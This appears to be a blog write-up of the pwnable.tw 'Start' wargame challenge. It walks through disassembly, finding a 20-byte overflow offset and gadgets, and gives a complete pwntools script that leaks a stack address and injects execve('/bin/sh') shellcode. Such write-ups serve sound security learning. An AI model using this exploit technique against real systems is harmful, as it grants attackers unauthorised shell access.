---
title: "[PWNABLE.TW] - Start"
published: 2025-01-30
description: "32-bits shellcode and ROP"
image: "../og_img.png"
tags:
  - PWN
category: "Wargame"
draft: false
---

# Description

> Just a start.

# Analysis
```sh
[*] '/home/alter/pwn/pwnable.tw/start/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

We begin by analyzing the binary, which lacks any protection mechanisms. The `NX` bit is disabled, meaning that we can consider a shellcode injection approach. To better understand how the binary operates, let's examine it in GDB.
```sh
pwndbg> info fun
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
```

From this output, we can see that the binary is quite minimal, and notably, it does not contain a main function. This suggests that the binary was likely handcrafted specifically for this challenge. Because of its small size and simplicity, reverse engineering it should be straightforward. Since `_start` is the entry point of the binary, so let's disassemble it to see what it does:

```sh
pwndbg> disass _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret
End of assembler dump.
```

Let's break it out to have more information about it:

- First it clear the registers for doing syscall purpose:
```sh
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
```

- Then push the value to the stack:

```sh
00:0000│ esp 0xffffce74 ◂— 0x2774654c ("Let'")
01:0004│     0xffffce78 ◂— 0x74732073 ('s st')
02:0008│     0xffffce7c ◂— 0x20747261 ('art ')
03:000c│     0xffffce80 ◂— 0x20656874 ('the ')
04:0010│     0xffffce84 ◂— 0x3a465443 ('CTF:')
```

- Next is using `write` syscall to write out 0x14 bytes data point by `esp`:

```sh
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
```

- And finally read our input using `read` syscall:

```sh
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
```

And seem like there's `Buffer Overflow` here so I tried with a very large padding for test:

```sh
pwndbg> cyclic 0x3c
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
pwndbg> r
Starting program: /home/alter/pwn/pwnable.tw/start/start
Let's start the CTF:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616166 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
 EAX  0x3c
 EBX  0
 ECX  0xffffce74 ◂— 0x61616161 ('aaaa')
 EDX  0x3c
 EDI  0
 ESI  0
 EBP  0
 ESP  0xffffce8c ◂— 0x61616167 ('gaaa')
 EIP  0x61616166 ('faaa')
────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
Invalid address 0x61616166



────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffce8c ◂— 0x61616167 ('gaaa')
01:0004│     0xffffce90 ◂— 0x61616168 ('haaa')
02:0008│     0xffffce94 ◂— 0x61616169 ('iaaa')
03:000c│     0xffffce98 ◂— 0x6161616a ('jaaa')
04:0010│     0xffffce9c ◂— 0x6161616b ('kaaa')
05:0014│     0xffffcea0 ◂— 0x6161616c ('laaa')
06:0018│     0xffffcea4 ◂— 0x6161616d ('maaa')
07:001c│     0xffffcea8 ◂— 0x6161616e ('naaa')
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► 0 0x61616166 None
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
pwndbg> cyclic -l faaa
Finding cyclic pattern of 4 bytes: b'faaa' (hex: 0x66616161)
Found at offset 20
```

And yes! We got the offset!

# Exploit

The problem here is that we know we can inject the shellcode, but how can we get it to execute? My idea is to find a way to leak an address from somewhere and then calculate the starting address of our shellcode. So let's see what gadgets we have:

```sh
$ ropper -f start
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======

0x0804809b: adc al, 0xc3; pop esp; xor eax, eax; inc eax; int 0x80;
0x08048099: add esp, 0x14; ret;
0x080480a0: inc eax; int 0x80;
0x0804808f: int 0x80;
0x08048097: int 0x80; add esp, 0x14; ret;
0x08048085: je 0xae; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x0804809a: les edx, ptr [ebx + eax*8]; pop esp; xor eax, eax; inc eax; int 0x80;
0x08048095: mov al, 3; int 0x80;
0x08048095: mov al, 3; int 0x80; add esp, 0x14; ret;
0x0804808d: mov al, 4; int 0x80;
0x0804808b: mov bl, 1; mov al, 4; int 0x80;
0x08048089: mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x08048093: mov dl, 0x3c; mov al, 3; int 0x80;
0x08048093: mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x08048087: mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x0804809d: pop esp; xor eax, eax; inc eax; int 0x80;
0x08048090: xor byte ptr [ecx], 0xdb; mov dl, 0x3c; mov al, 3; int 0x80;
0x08048090: xor byte ptr [ecx], 0xdb; mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x0804809e: xor eax, eax; inc eax; int 0x80;
0x08048091: xor ebx, ebx; mov dl, 0x3c; mov al, 3; int 0x80;
0x08048091: xor ebx, ebx; mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x0804809c: ret;

23 gadgets found
```

Hmmm, interesting. It seems there aren’t many useful gadgets, as I had guessed. It took me a lot of time to figure out how to use these gadgets effectively. Finally, I found one that found:
```sh
0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
```

This gadget has a useful property—it can print out the value at the top of the stack. If we look back at our analysis, we can see that this is part of the `write` syscall we examined earlier. And once we have the leak address just calculate back to our input `buf` and put the shellcode there and let the program return back to our shellcode (The program lets us input data a second time because we use gadgets in the `_start` function and it will perform all its instructions until it encounters `ret`)

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./start', checksec=False)
context.arch = 'i386'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*0x08048097
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

'''
0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
'''

def exploit():

    offset = 20
    print_stack = 0x08048086

    pl = cyclic(offset) + p32(print_stack)

    ru(b'CTF:')
    s(pl)

    stack_leak = u32(p.recv(4))
    slog('Stack leak', stack_leak)

    shellcode = asm('''
        mov al, 0xb
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
        ''')

    pl = shellcode.ljust(20, b'\x00') + p32(stack_leak - 4) + b'/bin/sh\0'
    s(pl)

    interactive()

if __name__ == '__main__':
  exploit()
```

P/S: My first shellcode didn’t look like this, but for some reason, it was still able to execute `execve`. So, I changed my approach to injecting `/bin/sh`.
